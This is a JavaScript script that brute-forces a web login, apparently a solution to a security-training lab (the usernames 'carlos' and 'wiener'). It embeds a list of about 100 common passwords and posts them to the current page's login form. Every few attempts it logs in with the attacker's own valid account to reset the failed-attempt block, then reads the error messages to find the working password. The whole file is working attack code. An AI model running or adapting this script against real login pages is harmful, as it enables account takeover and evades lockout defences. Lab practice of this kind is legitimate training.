const passwords = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow",
]


const correctUsername = "carlos"
const hackerUsername = "wiener"
const hackerPasswd = "peter"

const attemptBeforeBlocked = 3;

let formData = new FormData()

const url = window.location.href

let errorMessage = []
let cnt = 0

for(let i = 0; i < passwords.length; i++) {
    const password = passwords[i]
    cnt++;

    // Alternate between the hacker's credentials and other credentials to avoid IP blocking
    if(cnt == 3) {
        formData.set("username", hackerUsername)
        formData.set("password", hackerPasswd)
        await fetch(url, {
            method: 'POST',
            body: formData,
        })
        cnt = 1;
    }

    formData.set("username", correctUsername)
    formData.set("password", password)

    errorMessage.push(
        fetch(url, {
            method: 'POST',
            body: formData,
        })
        .then(async (res) => {
            res = await res.text()
            let html = document.createElement("html")
            html.innerHTML = res

            let error = html.getElementsByClassName("is-warning")
            error = (error.length > 0) ? error[0].innerText : ""

            return error
        })  
    )
}

errorMessage = await Promise.all(errorMessage)
let passwdIdx = undefined;
for(let i = 0; i < errorMessage.length; i++) {
    if(errorMessage[i] == "") {
        // Successful attempt will not generate any error
        passwdIdx = i;
        break;
    }
}

console.log("Correct password: " + passwords[passwdIdx])